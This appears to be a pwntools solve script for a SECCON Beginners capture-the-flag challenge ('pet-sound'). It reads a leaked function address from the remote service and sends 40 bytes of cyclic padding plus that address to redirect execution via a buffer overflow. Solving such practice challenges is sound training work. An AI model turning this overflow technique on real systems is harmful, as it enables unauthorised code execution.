from pwn import *

context.log_level = "debug"

# p: tube = process("./chall", shell=True)
p: tube = remote("pet-sound.challenges.beginners.seccon.jp", 9090)

p.recvuntil(b"[hint] The secret action 'speak_flag' is at: 0x")
speak_flag = int(p.recvline(), 16)
print(f"speak_flag: {hex(speak_flag)}")

payload = b""
payload += cyclic(32 + 8)
payload += p64(speak_flag)
p.recvuntil(b"Input a new cry for Pet A > ")
p.sendline(payload)

p.interactive()
